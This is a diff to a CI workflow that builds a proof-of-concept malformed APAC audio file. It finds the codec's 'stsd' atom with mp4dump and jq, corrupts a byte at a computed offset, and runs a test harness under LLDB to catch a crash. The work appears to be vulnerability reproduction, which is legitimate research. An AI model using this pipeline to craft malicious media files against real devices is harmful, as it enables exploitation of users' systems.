@@ -114,45 +114,44 @@ jobs:
           clang++ -g corruptor.cpp -o corruptor
           if [ ! -f ./corruptor ]; then echo "C++ corruptor compilation failed."; exit 1; fi
 
-      # This is the main step that finds the APAC track, extracts it, and corrupts it.
+      # This is the main step that finds the correct offset and corrupts the original file.
       - name: Extract and Surgically Corrupt APAC Track
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           set -x 
           
-          echo "Installing ffmpeg to identify the APAC stream..."
-          brew install ffmpeg
+          echo "Installing Bento4 and jq to find the correct atom offset..."
+          brew install bento4 jq
+          
+          # Use the new video file
+          BASE_FILE="IMG_1047.mov"
+          POC_FILE="output_apac_poc.mp4"
 
-          # Step 1: Use ffprobe to find the stream index for the 'apac' codec TAG.
-          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_tag_string -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1027.mov | grep 'apac' -B 1 | head -n 1)
+          # Create a copy to corrupt
+          cp "$BASE_FILE" "$POC_FILE"
 
-          if [ -z "$APAC_STREAM_INDEX" ]; then
-            echo "Could not find an APAC audio stream in the MOV file. Aborting."
+          # Step 1: Use mp4dump to create a JSON representation of the file structure.
+          mp4dump --format json "$POC_FILE" > atom_dump.json
+          
+          # Step 2: Use a robust jq query to find the 'stsd' atom containing the 'apac' codec definition.
+          OFFSET=$(jq -r '.. | objects | select(.name? == "stsd" and any(.children[]; .name? == "apac")) | .file_offset' atom_dump.json)
+
+          if [ -z "$OFFSET" ] || [ "$OFFSET" == "null" ]; then
+            echo "Could not find audio 'stsd' offset using jq. Please check atom_dump.json artifact."
             exit 1
           fi
-
-          echo "Found APAC audio in stream index: ${APAC_STREAM_INDEX}"
           
-          # Step 2: Use afconvert to extract the APAC stream into a clean, standalone M4A file.
-          # This creates a predictable file structure that is easier to corrupt reliably.
-          afconvert -d apac -f mp4f -s 2 IMG_1027.mov output_apac_clean.m4a
+          echo "Found APAC 'stsd' atom at offset ${OFFSET}"
           
-          if [ $? -ne 0 ]; then
-              echo "afconvert failed. This may mean the system is patched or the input file is not compatible."
-              # As a fallback, try to extract with ffmpeg, which may produce a less clean file
-              ffmpeg -i IMG_1027.mov -map 0:${APAC_STREAM_INDEX} -c:a copy output_apac_clean.m4a || exit 1
-          fi
+          # The channel layout tag is at a known position within the stsd atom.
+          CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
+          
+          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
 
-          echo "Successfully created a clean APAC file. Now corrupting it..."
-          cp output_apac_clean.m4a output_apac_poc.m4a
-
-          # Step 3: Run the C++ utility to perform the corruption.
-          # For a clean file created with afconvert, the offset is much more predictable.
-          CORRUPTION_OFFSET=288 
-          ./corruptor output_apac_poc.m4a $CORRUPTION_OFFSET
+          ./corruptor "$POC_FILE" $CORRUPTION_OFFSET
           
           echo "Malicious APAC PoC file generated."
-          ls -l output_apac_poc.m4a
+          ls -l "$POC_FILE"
           
       # Launch our custom player under LLDB to catch any crash.
       - name: Launch Player Under LLDB to Catch Crash
@@ -172,7 +171,7 @@ jobs:
           EOF
 
           echo "Launching custom Swift harness under LLDB..." >> $PLAYER_LOG_FILE
-          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true
+          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.mp4 >> $PLAYER_LOG_FILE 2>&1 || true
 
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
@@ -184,6 +183,7 @@ jobs:
         with:
           name: debug-and-poc-artifacts
           path: |
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
             AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
           retention-days: 7
